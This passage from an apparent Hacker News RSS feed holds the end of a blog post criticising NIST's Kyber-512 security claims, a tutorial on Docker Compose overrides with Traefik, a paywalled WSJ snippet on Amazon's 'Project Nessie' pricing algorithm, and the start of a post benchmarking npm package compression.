<p>NIST's call for submissions said the following:</p>
<blockquote>
<p>All submitters are advised to
be somewhat conservative in assigning parameters to a given category, but submitters of
algorithms where the complexity of the best known attack has recently decreased
significantly, or is otherwise poorly understood, should be especially conservative.</p>
</blockquote>
<p>How exactly is this being handled for the latest "category" claims?
Are the claims accounting for
the 32-bit range of "known unknowns" in the latest Kyber documentation?
A wider range given the "unknowns" appearing in newer papers?
An even wider range to protect against the likelihood of further attack speedups?</p>
<p>Readers understand the word "claim"
to be asserting that something is true,
not to be merely saying "we don't think it's terribly likely that this is false".
Why does this draft standard
conceal NIST's assessment of the probability of failure?</p>
<p>The official NISTPQC call for submissions said
<a href="https://web.archive.org/web/20220119113311/https://csrc.nist.gov/CSRC/media/Projects/Post-Quantum-Cryptography/documents/call-for-proposals-final-dec-2016.pdf">"NIST will perform a thorough analysis of the submitted algorithms in a manner that is open and transparent to the public"</a>.
Scholl said
<a href="https://web.archive.org/web/20211115191840/https://www.nist.gov/blogs/taking-measure/post-quantum-encryption-qa-nists-matt-scholl">"We operate transparently. We've shown all our work"</a>.
But the reality is that
security reviewers aren't even being given a clear statement of <em>what</em> exactly is being claimed about Kyber's security,
let alone what the justification for that claim is supposed to be.</p>
<p><strong>Next steps.</strong>
Given how unstable and poorly understood the lattice attack surface is,
standardizing Kyber-512 (or NTRU-509) would be reckless.</p>
<p>The poor understanding is a sign of danger.
Contrary to NISTBS,
it's entirely possible that Kyber-512 is substantially easier to break than AES-128
with attacks that have already been published,
even considering the costs of memory access.
The opposite is also possible.
Figuring out the actual status of this bleeding-edge proposal would be a tough research project.</p>
<p>The instability is another sign of danger.
How are we supposed to manage the risks of better attacks wiping out many more bits of security?</p>
<p>("Bad news: It's broken. Good news: Comparing it to AES-128 has become much easier.")</p>
<p>AES-128 isn't some stratospheric security level.
For example,
<a href="https://blog.cr.yp.to/20151120-batchattacks.html">multi-target attacks</a>
against AES-128
take only 2<sup>88</sup> computations to break one of a trillion keys.
That amount of computation is already feasible for large-scale attackers today.
Even if you think this is too expensive to worry about,
what happens if a cryptosystem actually loses 10 or 20 or 30 bits compared to that?</p>
<p>A paper at ACM CCS 2021
claimed to be able to show that one-out-of-many-ciphertext attacks against Kyber
are as hard as single-ciphertext attacks.
But I have a paper
<a href="https://cr.yp.to/papers.html#lprrr">"Multi-ciphertext security degradation for lattices"</a>
that</p>
<ul>
<li>
<p>points out an apparently unfixable flaw in the proof and</p>
</li>
<li>
<p>shows that,
  according to the heuristics used in Kyber's security analysis,
  particular multi-ciphertext attacks are asymptotically more efficient
  than the standard single-ciphertext attacks.</p>
</li>
</ul>
<p>The main theorem of my paper isn't easy but now has a proof
fully verified by <a href="https://www.cl.cam.ac.uk/~jrh13/hol-light/">HOL Light</a>.
"Asymptotically" refers to what happens when sizes grow to infinity;
more research is required to quantify
the impact of these multi-ciphertext attacks—and whatever improved attacks people
find—upon Kyber's limited range of sizes.
This is just one of many unexplored parts of the attack surface.</p>
<p>Some attack avenues have clear quantitative limits:
for example, 2<sup>40</sup>-target attacks can't eliminate more than 40 bits of security.
Replacing Kyber-512 with Kyber-1024 clearly reduces risks
(which is not to say that it eliminates <em>all</em> risks:
look at what happened to SIKE).
There are many previous examples in cryptography
of attacks that would have been stopped
if cryptographic parameters had been chosen just twice as large
as what people had thought was necessary.</p>
<p>Standardizing Kyber-512 means that Kyber-512 will be deployed
in many applications that would easily have been able to afford Kyber-1024 or NTRU-1229
or something even larger.
This is true even if the standard has Kyber-1024 (or Kyber-768)
as an option, even <em>the recommended option</em>.
It's
<a href="https://cr.yp.to/papers.html#competitions">easier</a>
for a manager to take the fastest option
than to investigate whether the fastest option is actually needed.
Why exactly <em>won't</em> a manager take the fastest option
if NIST has declared it to be a standard option?</p>
<p>Security is supposed to be job #1.
So I recommend eliminating Kyber-512.
I also recommend that NIST be honest with the public about what happened here:</p>
<ul>
<li>
<p>Honest NIST: "We were desperate to establish that Kyber-512 is as hard to break as AES-128,
  given the costs of memory access, assuming no attack improvements.
  This desperation led us to botch our security-level calculations. Sorry."</p>
</li>
<li>
<p>Public: "So you're withdrawing the claim that Kyber-512 qualifies for category 1?"</p>
</li>
<li>
<p>Honest NIST: "Correct. We are not making a claim either way.
  Settling this requires future research.
  Given the uncertainties regarding the performance of current attacks
  and the risks of better attacks,
  we are no longer planning to standardize Kyber-512.
  Our apologies to anyone who already invested effort in Kyber-512."</p>
</li>
<li>
<p>Public: "But, wait, doesn't removing Kyber-512
  make NTRU the clear winner in flexibility and performance?"</p>
</li>
<li>
<p>Honest NIST: "Yes.
  We were desperate to create the opposite perception.
  That's why we were desperate to keep Kyber-512.
  That's also why we were manipulating our selection and presentation of data in other ways,
  for example by kicking out NTRU-509 on the basis of gate counts
  while keeping Kyber-512 on the basis of memory-access costs.
  Sorry."</p>
</li>
<li>
<p>Public: "Partway through the competition,
  you suddenly started criticizing submissions that weren't providing category 5.
  NTRU responded with parameters having much higher Core-SVP than Kyber-1024.
  Does Kyber-1024 meet category 5?"</p>
</li>
<li>
<p>Honest NIST: "Figuring that out would be another tough research project.
  The latest versions of Kyber-512, Kyber-768, and Kyber-1024
  report Core-SVP 2<sup>118</sup>, 2<sup>183</sup>, and 2<sup>256</sup>,
  so we extrapolated from saying that Kyber-512 is in category 1
  to saying that Kyber-768 is in category 3 and that Kyber-1024 is in category 5.
  We never looked at the details.
  Sorry."</p>
</li>
<li>
<p>Public: "Doesn't your official report say that you're confident in the security of NTRU?
  Doesn't this mean that NTRU actually scores better than Kyber on all three evaluation factors?"</p>
</li>
<li>
<p>Honest NIST: "Yes.
  The only decisive factor listed in our selection report was that
  Kyber was 'near the top (if not the top) in most benchmarks'.
  Without Kyber-512, Kyber can't compete with NTRU in performance.
  Sorry."</p>
</li>
<li>
<p>Public: "Why were you so desperate to take Kyber over NTRU in the first place?"</p>
</li>
<li>
<p>Honest NIST: "Here are the full records that we were keeping secret,
  and in particular they answer that question.
  These records also show why we weren't meeting our commitment to operate transparently,
  and why we repeatedly lied about this."</p>
</li>
<li>
<p>Public: "You exposed three years of user data to attackers
  by telling people to use Kyber starting when your patent license activates in 2024,
  rather than telling people to use NTRU starting in 2021!"</p>
</li>
<li>
<p>Honest NIST: "Sorry. What's done is done.
  We're locked into standardizing Kyber at this point,
  and deviating from this would produce even more slowdowns.
  We'll standardize Kyber-768 as category 2 and Kyber-1024 as category 4."</p>
</li>
</ul>
<p>After everything that has happened,
I'm skeptical that we're going to suddenly see Honest NIST,
but hope springs eternal.</p><hr><span size="1"><b>Version:</b>
This is version 2023.10.03 of the 20231003-countcorrectly.html web page.
</span>

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Working on Multiple Web Projects with Docker Compose and Traefik (110 pts)]]></title>
            <link>https://georgek.github.io/blog/posts/multiple-web-projects-traefik/</link>
            <guid>37756632</guid>
            <pubDate>Tue, 03 Oct 2023 19:46:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://georgek.github.io/blog/posts/multiple-web-projects-traefik/">https://georgek.github.io/blog/posts/multiple-web-projects-traefik/</a>, See on <a href="https://news.ycombinator.com/item?id=37756632">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>Docker Compose is a brilliant tool for bringing up local development environments for
web projects. But working with multiple projects can be a pain due to clashes. For
example, all projects want to listen to port 80 (or perhaps one of the super common
higher ones like 8000 etc.). This forces developers to only bring one project up at a
time, or hack the compose files to change the port numbers.</p><p>Recently I've found a way that makes managing these more enjoyable.</p><div id="outline-container-headline-1"><h2 id="headline-1">A single project with Docker Compose</h2><div id="outline-text-headline-1"><p>I use <a href="https://docs.docker.com/compose/">docker compose</a> to manage local development instances of these projects. A typical
compose file for a web project might look like this:</p><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span></code></pre></td><td><pre tabindex="0"><code data-lang="yaml"><span><span><span># proj/compose.yaml</span>
</span></span><span><span><span>services</span>:
</span></span><span><span>  <span>db</span>:
</span></span><span><span>    <span>image</span>: <span>"postgres"</span>
</span></span><span><span>    <span>environment</span>:
</span></span><span><span>      <span>POSTGRES_DB</span>: <span>"proj"</span>
</span></span><span><span>      <span>POSTGRES_USER</span>: <span>"user"</span>
</span></span><span><span>      <span>POSTGRES_PASSWORD</span>: <span>"pass"</span>
</span></span><span><span>
</span></span><span><span>  <span>web</span>:
</span></span><span><span>    <span>build</span>: .
</span></span><span><span>    <span>depends_on</span>:
</span></span><span><span>      - <span>"db"</span>
</span></span><span><span>    <span>environment</span>:
</span></span><span><span>      <span>DATABASE_URL</span>: <span>"postgres://user:pass@db/proj"</span>
</span></span><span><span>    <span>ports</span>:
</span></span><span><span>      - <span>"8000:80"</span></span></span></code></pre></td></tr></tbody></table></div><p>Note the very last line. This is where we map port 8000 from the host to port 80 of the
container such that the service can be accessed via <code>http://127.0.0.1:8000</code>.</p><p>This works quite well for a single project, but it suffers from a couple of problems if
you work on multiple projects:</p><ol><li>It doesn't scale. If I want to run another project at the same time, I'll have to
use a different port number, maybe 8001, then 8002 etc.,</li><li>What if that <code>compose.yaml</code> file is checked in as part of the project? Does the whole
team have to agree on a set of port numbers to use for each project?</li></ol></div></div><div id="outline-container-headline-2"><h2 id="headline-2">Using overrides for multiple projects</h2><div id="outline-text-headline-2"><p>Fortunately Docker Compose does have a solution for (2) in the form of the
<code>compose.override.yaml</code> file. This file will be automatically be <a href="https://docs.docker.com/compose/multiple-compose-files/merge/">merged</a> into the
<code>compose.yaml</code> without any extra configuration.</p><p>Unlike some other guides (including the official <a href="https://docs.docker.com/compose/multiple-compose-files/merge/#example">docs</a>) concerning this file, I prefer to
<strong>not</strong> check <code>compose.override.yaml</code> into version control and instead add it to the
<code>.gitignore</code> file. Adding it to version control completely defeats the purpose of it: to
allow individual developers to override the standard compose file.</p><p>So, with this in mind, I no longer expose any ports by default in <code>compose.yaml</code> because
I don't know what will be convenient for each developer. This set up might look like
this:</p><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span></code></pre></td><td><pre tabindex="0"><code data-lang="yaml"><span><span><span># compose.yaml</span>
</span></span><span><span><span>services</span>:
</span></span><span><span>  <span>db</span>:
</span></span><span><span>    <span>image</span>: <span>"postgres"</span>
</span></span><span><span>    <span>environment</span>:
</span></span><span><span>      <span>POSTGRES_DB</span>: <span>"proj"</span>
</span></span><span><span>      <span>POSTGRES_USER</span>: <span>"user"</span>
</span></span><span><span>      <span>POSTGRES_PASSWORD</span>: <span>"pass"</span>
</span></span><span><span>
</span></span><span><span>  <span>web</span>:
</span></span><span><span>    <span>build</span>: .
</span></span><span><span>    <span>depends_on</span>:
</span></span><span><span>      - <span>"db"</span>
</span></span><span><span>    <span>environment</span>:
</span></span><span><span>      <span>DATABASE_URL</span>: <span>"postgres://user:pass@db/proj"</span></span></span></code></pre></td></tr></tbody></table></div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td><td><pre tabindex="0"><code data-lang="yaml"><span><span><span># compose.override.yaml (to be created by each developer)</span>
</span></span><span><span><span>services</span>:
</span></span><span><span>  <span>web</span>:
</span></span><span><span>    <span>ports</span>:
</span></span><span><span>      - <span>"8000:80"</span></span></span></code></pre></td></tr></tbody></table></div></div></div><div id="outline-container-headline-3"><h2 id="headline-3">Using Traefik</h2><div id="outline-text-headline-3"><p>So now each developer can pick their own port numbers for each project, but we can still
do better than this. People aren't good at remembering numbers. We are much better at
remembering names. <a href="https://doc.traefik.io/traefik/">Traefik</a> is a free software edge router that can be used as a simple
and super easy to configure reverse-proxy in container-based set ups.</p><p>Using Docker, Traefik can automatically discover services to create routes to. It uses
container labels to further configure these routes. The following tiny example from the
<a href="https://doc.traefik.io/traefik/getting-started/quick-start/">docs</a> is illustrative:</p><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span></code></pre></td><td><pre tabindex="0"><code data-lang="yaml"><span><span><span># traefik/compose.yaml</span>
</span></span><span><span><span>services</span>:
</span></span><span><span>  <span>reverse-proxy</span>:
</span></span><span><span>    <span>image</span>: traefik:v2.10
</span></span><span><span>    <span>ports</span>:
</span></span><span><span>      - <span>"80:80"</span>
</span></span><span><span>    <span>volumes</span>:
</span></span><span><span>      - /var/run/docker.sock:/var/run/docker.sock
</span></span><span><span>  <span>whoami</span>:
</span></span><span><span>    <span>image</span>: traefik/whoami
</span></span><span><span>    <span>labels</span>:
</span></span><span><span>      - <span>"traefik.http.routers.whoami.rule=Host(`whoami.docker.localhost`)"</span></span></span></code></pre></td></tr></tbody></table></div><p>This starts two containers on the same docker network. The reverse proxy listens on
port 80 and forwards traffic with a host header of "whoami.docker.localhost" to the
<code>whoami</code> service. Traefik guesses which port to send it to <code>whoami</code> based on the ports
exposed by the container.</p><p>If you haven't played with Traefik before it's worth going through the <a href="https://doc.traefik.io/traefik/getting-started/quick-start/">quick-start</a>
properly now then coming back to see how we can make this work for multiple projects.</p></div></div><div id="outline-container-headline-4"><p>This doesn't quite solve our problem yet. We don't want all of our various projects
inside one compose file. Luckily Traefik communicates with the Docker daemon directly
and doesn't really care about the compose file, but you do need to make sure a few
things are in order for this to work.</p><p>Firstly, make a docker network especially for Traefik to communicate with other services
that you want to expose, for example:</p><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span></code></pre></td><td><pre tabindex="0"><code data-lang="yaml"><span><span><span># traefik/compose.yaml</span>
</span></span><span><span><span>services</span>:
</span></span><span><span>  <span>reverse-proxy</span>:
</span></span><span><span>    <span>image</span>: traefik:v2.10
</span></span><span><span>    <span>restart</span>: unless-stopped
</span></span><span><span>    <span>command</span>: --api.insecure=true --providers.docker
</span></span><span><span>    <span>ports</span>:
</span></span><span><span>      - <span>"80:80"</span>
</span></span><span><span>      - <span>"8080:8080"</span>
</span></span><span><span>    <span>volumes</span>:
</span></span><span><span>      - <span>"/var/run/docker.sock:/var/run/docker.sock"</span>
</span></span><span><span>    <span>networks</span>:
</span></span><span><span>      - traefik
</span></span><span><span>
</span></span><span><span><span>networks</span>:
</span></span><span><span>  <span>traefik</span>:
</span></span><span><span>    <span>attachable</span>: <span>true</span>
</span></span><span><span>    <span>name</span>: traefik</span></span></code></pre></td></tr></tbody></table></div><p>We create the network <code>traefik</code> and give it the name "traefik" (otherwise docker compose
would scope it by project, e.g. "traefik_traefik"). We also allow other containers to
attach to this network.</p><p>Then in our <code>compose.override.yaml</code> file from above, instead of mapping ports, we do the
following:</p><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span></code></pre></td><td><pre tabindex="0"><code data-lang="yaml"><span><span><span># proj/compose.override.yaml</span>
</span></span><span><span><span>services</span>:
</span></span><span><span>  <span>web</span>:
</span></span><span><span>    <span>labels</span>:
</span></span><span><span>      - <span>"traefik.http.routers.proj.rule=Host(`proj.traefik.me`)"</span>
</span></span><span><span>      - <span>"traefik.http.services.proj.loadbalancer.server.port=8000"</span>
</span></span><span><span>      - <span>"traefik.docker.network=traefik"</span>
</span></span><span><span>    <span>networks</span>:
</span></span><span><span>      - default
</span></span><span><span>      - traefik
</span></span><span><span>
</span></span><span><span><span>networks</span>:
</span></span><span><span>  <span>traefik</span>:
</span></span><span><span>    <span>external</span>: <span>true</span></span></span></code></pre></td></tr></tbody></table></div><p>Now, after bringing up first the traefik project then your web project, you should be
able to browse to <a href="http://proj.traefik.me/">http://proj.traefik.me/</a> in your web browser.</p><p>There's a few things going on here. First, we have declared the <code>traefik</code> network as an
external network. This means compose won't manage it, but expects it to exist (so you
must start your traefik composition first). Next we override the <code>networks</code> setting of
<code>web</code> to make it part of the <code>traefik</code> network too. Note we also have to add the
<code>default</code> network, otherwise it wouldn't be able to communicate with <code>db</code> and other
services on its own default network.</p><p>The <code>traefik.http.routers.proj.rule</code> label configures Traefik to route HTTP traffic with
the "proj.traefik.me" hostname to the container. The <code>traffic.docker.network</code> label is
necessary because <code>web</code> is on two networks. Finally, we set
<code>traefik.http.services.proj.loadbalancer.server.port</code> for completeness, just in case
your container needs a different port mapping than the port it is set to expose, or if
it exposes multiple ports.</p><p>There is one final piece of magic: the "traefik.me" hostname. What is that? You can
read about it at <a href="http://traefik.me/">http://traefik.me/</a>. Essentially it is a DNS service that resolves to
any IP address that you want, but by default it resolves <code>&lt;xxx&gt;.traefik.me</code> to
<code>127.0.0.1</code>. There are other services like this including <a href="https://sslip.io/">https://sslip.io/</a> and
<a href="https://nip.io/">https://nip.io/</a>.</p><p>Now, because we don't need to define any ports at all, it is possible to take advantage
of a newish compose feature and reinstate the ports in the original <code>compose.yaml</code> file
for those developers who don't want to set up Traefik for themselves. So our final
configuration looks like this:</p><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span></code></pre></td><td><pre tabindex="0"><code data-lang="yaml"><span><span><span># compose.yaml</span>
</span></span><span><span><span>services</span>:
</span></span><span><span>  <span>db</span>:
</span></span><span><span>    <span>image</span>: <span>"postgres"</span>
</span></span><span><span>    <span>environment</span>:
</span></span><span><span>      <span>POSTGRES_DB</span>: <span>"proj"</span>
</span></span><span><span>      <span>POSTGRES_USER</span>: <span>"user"</span>
</span></span><span><span>      <span>POSTGRES_PASSWORD</span>: <span>"pass"</span>
</span></span><span><span>
</span></span><span><span>  <span>web</span>:
</span></span><span><span>    <span>build</span>: .
</span></span><span><span>    <span>depends_on</span>:
</span></span><span><span>      - <span>"db"</span>
</span></span><span><span>    <span>environment</span>:
</span></span><span><span>      <span>DATABASE_URL</span>: <span>"postgres://user:pass@db/proj"</span>
</span></span><span><span>    <span>ports</span>:
</span></span><span><span>      - <span>"8000:80"</span></span></span></code></pre></td></tr></tbody></table></div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span></code></pre></td><td><pre tabindex="0"><code data-lang="yaml"><span><span><span># compose.override.yaml (to be created by each developer)</span>
</span></span><span><span><span>services</span>:
</span></span><span><span>  <span>web</span>:
</span></span><span><span>    <span>labels</span>:
</span></span><span><span>      - <span>"traefik.http.routers.proj.rule=Host(`proj.traefik.me`)"</span>
</span></span><span><span>      - <span>"traefik.http.services.proj.loadbalancer.server.port=8000"</span>
</span></span><span><span>      - <span>"traefik.docker.network=traefik"</span>
</span></span><span><span>    <span>networks</span>:
</span></span><span><span>      - default
</span></span><span><span>      - traefik
</span></span><span><span>    <span>ports</span>: !reset []
</span></span><span><span>
</span></span><span><span><span>networks</span>:
</span></span><span><span>  <span>traefik</span>:
</span></span><span><span>    <span>external</span>: <span>true</span></span></span></code></pre></td></tr></tbody></table></div><p>The <code>!reset []</code> tag sets the ports back to empty; you can read about it <a href="https://docs.docker.com/compose/compose-file/13-merge/#reset-value">here</a>. Note that
unfortunately it can't be used to set <em>new</em> ports, only reset them to default (you would
have to use two layers of override file to set new ports). The <code>!reset</code> tag requires a
fairly recent version of docker compose, at least greater than 2.18.0.</p><p>A final note: you can check that these overrides are working correctly by running
<code>docker compose config</code>.</p></div><div id="outline-container-headline-5"><h2 id="headline-5">Conclusion</h2><div id="outline-text-headline-5"><p>By leveraging both the <code>compose.override.yaml</code> file and Traefik it's easy to run
multiple web projects on your development system at the same time and have easy to
remember names to access them all. Each developer is free to run as many as they want
and create their own easily-manageable configurations. Traefik and traefik.me can also
be used to allow other developers on your network to easily access your local
development instances with no DNS configuration required.</p><p>It's a shame that the docs instruct people to use the override file for a distributed
developer config rather than let individual developers use it, but hopefully it's not
too hard to remove this file from repos if already present.</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Amazon Used Secret ‘Project Nessie’ Algorithm to Raise Prices (249 pts)]]></title>
            <link>https://www.wsj.com/business/retail/amazon-used-secret-project-nessie-algorithm-to-raise-prices-6c593706</link>
            <guid>37755648</guid>
            <pubDate>Tue, 03 Oct 2023 18:23:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wsj.com/business/retail/amazon-used-secret-project-nessie-algorithm-to-raise-prices-6c593706">https://www.wsj.com/business/retail/amazon-used-secret-project-nessie-algorithm-to-raise-prices-6c593706</a>, See on <a href="https://news.ycombinator.com/item?id=37755648">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><div display="flex"><nav aria-label="breadcrumbs"><ol><li><div><p data-testid="flashline">WSJ News Exclusive</p></div></li><li><a href="https://www.wsj.com/business/retail?mod=breadcrumb" data-testid="breadcrumb-link"><span><span><span>Retail</span></span></span></a></li></ol></nav></div><h2>The strategy, as described in redacted parts of FTC lawsuit, is part of agency’s case that Amazon has outsize influence on consumer prices</h2></div><article><div><div><div> <p>By </p><p><a data-testid="author-link" href="https://www.wsj.com/news/author/dana-mattioli" target="_blank" aria-label="Author page for Dana Mattioli"><span><span>Dana Mattioli</span></span></a></p></div><div><p>Updated Oct. 3, 2023 4:54 pm ET</p></div></div><div aria-label="Utility Bar" role="toolbar" data-block="doNotPrint"></div><section><div data-type="video" data-inset_type="" data-sub_type="" data-layout="inline"><figure><figcaption>Since Lina Khan became Federal Trade Commission chair in 2021, she’s taken on Meta, Microsoft, and Amazon, and that’s made her a lightning rod for controversy. WSJ breaks down the battles she’s picked and why she’s willing to lose. Photo illustration: Xingpei Shen</figcaption></figure></div><p data-type="paragraph">Amazon.com<!-- --> used an algorithm code-named “Project Nessie” to test how much it could raise prices in a way that competitors would follow, according to redacted portions of <a data-type="link" href="https://www.wsj.com/tech/ftc-sues-amazon-alleging-illegal-online-marketplace-monopoly-6bd9af23?mod=article_inline" rel="">the Federal Trade Commission’s monopoly lawsuit</a> against the company.</p></section><p>Copyright ©<!-- -->2023<!-- --> Dow Jones &amp; Company, Inc. All Rights Reserved. 87990cbe856818d5eddac44c7b1cdeb8</p><div><div id="cx-snippet-overlay"><p><img src="https://sts3.wsj.net/iweb/images/wsj-logo-big-black.svg" title="The Wall Street Journal" alt=""></p><p>Continue reading your article with<br>a WSJ subscription</p><p><a href="https://subscribe.wsj.com/wsjsnippet">Subscribe Now</a></p></div><p>Already a subscriber? <a href="https://www.wsj.com/client/login?target=https%3A%2F%2Fwww.wsj.com%2Fbusiness%2Fretail%2Famazon-used-secret-project-nessie-algorithm-to-raise-prices-6c593706">Sign In</a></p></div><div aria-label="What to Read Next" data-block="doNotPrint" data-skip-nav-order="5" data-skip-label="What to Read Next" role="region" tabindex="-1"><p><h2>What to Read Next</h2></p></div><div aria-label="Sponsored Offers" data-block="doNotPrint" data-skip-nav-order="6" data-skip-label="Sponsored Offers" role="region" tabindex="-1"><p>Sponsored Offers</p><ul><li><span>TurboTax<!-- -->: <br></span><a href="https://www.wsj.com/coupons/turbotax" target="_blank" rel="noreferrer">Save up to $15 with TurboTax coupon 2023</a></li><li><span>The Motley Fool<!-- -->: <br></span><a href="https://www.wsj.com/coupons/motley-fool" target="_blank" rel="noreferrer">Epic Bundle - 3x Expert Stock Recommendations</a></li><li><span>H&amp;R Block Tax<!-- -->: <br></span><a href="https://www.wsj.com/coupons/hr-block" target="_blank" rel="noreferrer">15% OFF DIY Online Tax Filing Services | H&amp;R Block Coupon</a></li><li><span>Top Resume<!-- -->: <br></span><a href="https://www.wsj.com/coupons/topresume" target="_blank" rel="noreferrer">Top Resume Coupon: 10% Off professional resume writing</a></li><li><span>eBay<!-- -->: <br></span><a href="https://www.wsj.com/coupons/ebay" target="_blank" rel="noreferrer">Save 25% on designer items using this eBay coupon</a></li><li><span>Groupon<!-- -->: <br></span><a href="https://www.wsj.com/coupons/groupon" target="_blank" rel="noreferrer">Up to $50 off any order with Groupon promo code</a></li></ul></div></div></article><div><div type="news" aria-label="Most Popular News" data-skip-label="Most Popular News" data-skip-nav-order="6" role="complementary" tabindex="-1" width="300px"><h4 type="news">Most Popular news</h4><div></div></div><div aria-label="Most Popular Opinion" data-skip-label="Most Popular Opinion" data-skip-nav-order="7" role="complementary" tabindex="-1" width="300px"><div type="opinion"><h4 type="opinion">Most Popular opinion</h4><div></div></div><div type="opinion_new"><h4 type="opinion_new">Most Popular Opinion</h4><div></div></div></div><div aria-label="Recommended Videos" data-skip-nav-order="8" data-skip-label="Recommended Videos" role="complementary" tabindex="-1" width="300px"><h4>Recommended Videos</h4></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Honey, I shrunk the NPM package (129 pts)]]></title>
            <link>https://jamiemagee.co.uk/blog/honey-i-shrunk-the-npm-package/</link>
            <guid>37754489</guid>
            <pubDate>Tue, 03 Oct 2023 16:55:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jamiemagee.co.uk/blog/honey-i-shrunk-the-npm-package/">https://jamiemagee.co.uk/blog/honey-i-shrunk-the-npm-package/</a>, See on <a href="https://news.ycombinator.com/item?id=37754489">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><span>Sep 27, 2023 · 11 minute read · <a href="https://jamiemagee.co.uk/blog/honey-i-shrunk-the-npm-package/#disqus_thread">Comments</a></span></p><p>Have you ever wondered what lies beneath the surface of an npm package? At its heart, it’s nothing more than a gzipped tarball. Working in software development, source code and binary artifacts are nearly always shipped as <code>.tar.gz</code> or <code>.tgz</code> files. And gzip compression is supported by every HTTP server and web browser out there. <a href="http://caniuse.com/">caniuse.com</a> doesn’t even give statistics for support, it just says “<a href="https://caniuse.com/sr_content-encoding-gzip">supported in effectively all browsers</a>”. But here’s the kicker: gzip is starting to show its age, making way for newer, more modern compression algorithms like Brotli and ZStandard. Now, imagine a world where npm embraces one of these new algorithms. In this blog post, I’ll dive into the realm of compression and explore the possibilities of moderinising npm’s compression strategy.</p><h2 id="whats-the-competition">What’s the competition?</h2><p>The two major players in this space are Brotli and ZStandard (or zstd for short). Brotli was released by Google in 2013 and zstd was released by Facebook in 2016. They’ve since been standardised, in <a href="https://datatracker.ietf.org/doc/html/rfc7932">RFC 7932</a> and <a href="https://datatracker.ietf.org/doc/html/rfc8478">RFC 8478</a> respectively, and have seen widespread use all over the software industry. It was actually <a href="https://archlinux.org/news/now-using-zstandard-instead-of-xz-for-package-compression/">the announcement</a> by Arch Linux that they were going to start compressing their packages with zstd by default that made think about this in the first place. Arch Linux was by no means the first project, nor is it the only one. But to find out if it makes sense for the Node ecosystem, I need to do some benchmarks. And that means breaking out <code>tar</code>.</p><h2 id="benchmarking-part-1">Benchmarking part 1</h2><figure><img src="https://jamiemagee.co.uk/img/xkcd-1168.png" alt="https://xkcd.com/1168/" title="I don't know what's worse--the fact that after 15 years of using tar I still can't keep the flags straight, or that after 15 years of technological advancement I'm still mucking with tar flags that were 15 years old when I started."><figcaption>https://xkcd.com/1168</figcaption></figure><p>I’m going to start with <code>tar</code> and see what sort of comparisons I can get by switching gzip, Brotli, and zstd. I’ll test with <a href="https://www.npmjs.com/package/npm">the npm package of npm itself</a> as it’s a pretty popular package, averaging over 4 million downloads a week, while also being quite large at around 11MB unpacked.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>1</span><span>$ curl --remote-name https://registry.npmjs.org/npm/-/npm-9.7.1.tgz
</span></span><span><span>2</span><span>$ ls -l --human npm-9.7.1.tgz 
</span></span><span><span>3</span><span>-rw-r--r-- <span>1</span> jamie users 2.6M Jun <span>16</span> 20:30 npm-9.7.1.tgz 
</span></span><span><span>4</span><span>$ tar --extract --gzip --file npm-9.7.1.tgz
</span></span><span><span>5</span><span>$ du --summarize --human --apparent-size package
</span></span><span><span>6</span><span>11M	package
</span></span></code></pre></div><p>gzip is already giving good results, compressing 11MB to 2.6MB for a compression ratio of around 0.24. But what can the contenders do? I’m going to stick with the default options for now:</p><div><pre tabindex="0"><code data-lang="bash"><span><span> 1</span><span>$ brotli --version
</span></span><span><span> 2</span><span>brotli 1.0.9
</span></span><span><span> 3</span><span>$ tar --use-compress-program brotli --create --file npm-9.7.1.tar.br package
</span></span><span><span> 4</span><span>$ zstd --version
</span></span><span><span> 5</span><span>*** Zstandard CLI <span>(</span>64-bit<span>)</span> v1.5.5, by Yann Collet ***
</span></span><span><span> 6</span><span>$ tar --use-compress-program zstd --create --file npm-9.7.1.tar.zst package
</span></span><span><span> 7</span><span>$ ls -l --human npm-9.7.1.tgz npm-9.7.1.tar.br npm-9.7.1.tar.zst 
</span></span><span><span> 8</span><span>-rw-r--r-- <span>1</span> jamie users 1.6M Jun <span>16</span> 21:14 npm-9.7.1.tar.br
